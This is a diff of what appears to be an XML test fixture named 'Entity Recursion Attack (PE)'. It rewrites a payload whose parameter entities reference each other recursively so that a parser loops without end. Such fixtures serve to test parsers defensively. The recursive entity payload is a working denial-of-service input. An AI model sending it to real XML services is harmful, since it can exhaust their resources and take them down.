@@ -5,7 +5,8 @@ name: Entity Recursion Attack (PE)
 description: Entity Expansion Attack that causes an endless loop (Parameter Entity Version)
 -->
 <!DOCTYPE root [
-  <!ENTITY % a "a&b;">
-  <!ENTITY % b "b&a;">
+  <!ENTITY % a "a%b;">
+  <!ENTITY % b "b%a;">
+  <!ENTITY c "%a;">
 ]>
-<root>&a;</root>
+<root>&c;</root>
